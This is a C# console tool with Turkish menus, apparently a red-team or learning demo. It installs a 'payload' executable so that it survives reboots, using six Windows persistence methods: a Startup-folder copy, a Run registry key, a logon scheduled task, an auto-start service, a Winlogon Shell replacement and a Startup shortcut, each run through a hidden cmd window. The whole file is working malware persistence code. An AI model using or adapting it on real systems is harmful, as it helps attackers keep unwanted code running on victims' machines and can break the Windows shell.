using System;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.IO;
using Shell32;

namespace kaliciOlma
{
    internal class Program
    {

        static void ExecuteCmdCommand(string cmdCommand)
        {
            try
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {cmdCommand}",  
                    CreateNoWindow = true,          
                    UseShellExecute = false,        
                    RedirectStandardOutput = true,  
                    RedirectStandardError = true    
                };

                
                Process process = Process.Start(processStartInfo);


                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                    Console.WriteLine("Çıktı: " + output);
                if (!string.IsNullOrEmpty(error))
                    Console.WriteLine("Hata: " + error);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Komut çalıştırılırken hata oluştu: " + ex.Message);
            }
        }

        public static void StartupFile()
        {
            try
            {
                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");
               
                if (!File.Exists(sourceFilePath))
                {
                    Console.WriteLine("Payload dosyası bulunamadı");
                    return;
                }

                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                string destinationFilePath = Path.Combine(startupFolder, Path.GetFileName(sourceFilePath));

                string cmdCommand = $"copy \"{sourceFilePath}\" \"{destinationFilePath}\"";

                ExecuteCmdCommand(cmdCommand);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }

            Console.WriteLine("---------------------\n");
        }



        public static void AddRegistry()
        {
            try
            {
                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");

                if (!File.Exists(sourceFilePath))
                {
                    Console.WriteLine("Payload dosyası bulunamadı");
                    return;
                }

                string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

                string registryKeyName = "test";

                string cmdCommand = $"reg add \"HKCU\\{registryKeyPath}\" /v {registryKeyName} /t REG_SZ /d \"{sourceFilePath}\" /f";

                ExecuteCmdCommand(cmdCommand);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }

            Console.WriteLine("---------------------\n");
        }

        public static void gorev_zamalayicisi()
        {
            try
            {
                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");

                if (!File.Exists(sourceFilePath))
                {
                    Console.WriteLine("Payload dosyası bulunamadı");
                    return;
                }

                string taskName = "test";

                string cmdCommand = $"schtasks /create /tn \"{taskName}\" /tr \"{sourceFilePath}\" /sc onlogon /f";


                ExecuteCmdCommand(cmdCommand);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }

            Console.WriteLine("---------------------\n");
        }

        public static void AddService()
        {
            try
            {
                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");

                if (!File.Exists(sourceFilePath))
                {
                    Console.WriteLine("Payload dosyası bulunamadı");
                    return;
                }

                string serviceName = "denemeService1";

                string cmdCommand = $"sc create \"{serviceName}\" binPath= \"{sourceFilePath}\" start= auto";
                string startServie = $"sc start \"{serviceName}\"";

                ExecuteCmdCommand(cmdCommand);

            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }

            Console.WriteLine("---------------------\n");
        }

      


        public static void winlogon()
        {
            try
            {
                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");

                if (!File.Exists(sourceFilePath))
                {
                    Console.WriteLine("Payload dosyası bulunamadı");
                    return;
                }
                    string cmdCommand = $"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"{sourceFilePath}\" /f";

                ExecuteCmdCommand(cmdCommand);

                  }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }
        }


        public static void lnk()
        {

            string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");

            if (!File.Exists(sourceFilePath))
            {
                Console.WriteLine("Payload dosyası bulunamadı");
                return;
            }
            string shortcutName = "TestShortcut.lnk";

            string createShortcutCmd = $@"powershell ""$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%USERPROFILE%\Desktop\{shortcutName}'); $s.TargetPath = '{sourceFilePath}'; $s.Save()""";
            string moveShortcutCmd = $@"move ""%USERPROFILE%\Desktop\{shortcutName}"" ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""";

            ExecuteCmdCommand(createShortcutCmd);

            ExecuteCmdCommand(moveShortcutCmd);
        }




        public static void All()
        {
            StartupFile();
            AddRegistry();
            gorev_zamalayicisi();
            AddService();
            winlogon();
            lnk();
        }


        static void Main(string[] args)
        {
            while (true)
            {
                Console.WriteLine("1 - Tümünü Çalıştır");
                Console.WriteLine("2 - Başlangıç Klasörüne Dosya Ekleme");
                Console.WriteLine("3 - Registry Kullanımı");
                Console.WriteLine("4 - Görev Zamanlayıcı Kullanımı");
                Console.WriteLine("5 - Servis Ekleme");
                Console.WriteLine("6 - Winlogon Shell Değiştirme");
                Console.WriteLine("7 - LNK Dosyası");
                Console.WriteLine("Çıkmak için 'q' tuşuna basın.");
                Console.Write("Seçiniz: ");
                string choice = Console.ReadLine();
                Console.Write("\n");

                switch (choice)
                {
                    case "1":
                        All();
                        break;

                    case "2":
                        StartupFile();
                        break;

                    case "3":
                        AddRegistry();
                        break;

                    case "4":
                        gorev_zamalayicisi();
                        break;

                    case "5":
                        AddService();
                        break;

                    case "6":
                        winlogon();
                        
                        break;

                    case "7":
                        lnk();
                        break;

                    case "q":
                        return;

                    default:
                        Console.WriteLine("Geçersiz seçenek, tekrar deneyin.");
                        break;
                }

            }
        }
    }
}
